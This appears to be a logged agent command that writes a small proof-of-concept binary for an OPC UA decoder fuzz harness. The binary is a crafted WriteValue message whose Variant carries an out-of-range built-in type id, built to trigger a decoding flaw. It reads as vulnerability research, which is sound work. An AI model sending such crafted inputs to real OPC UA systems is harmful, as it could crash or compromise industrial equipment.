Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc1.bin')
b=bytearray()
b.append(194)  # fuzz_decoder type index: OpcUa_WriteValue
# OpcUa_WriteValue: NodeId(two-byte), AttributeId, IndexRange(null string), DataValue
b += bytes([0x00, 0x01])          # NodeId TwoByte, id 1
b += (13).to_bytes(4,'little')    # AttributeId (Value)
b += (-1).to_bytes(4,'little', signed=True) # null IndexRange
b += bytes([0x01])                # DataValue: value present
b += bytes([0x9a])                # Variant array flag | BuiltInTypeId 26 (SOPC_BUILTINID_MAX+1)
b += (0).to_bytes(4,'little', signed=True) # array length
p.write_bytes(b)
print(p, len(b), b.hex())
PY
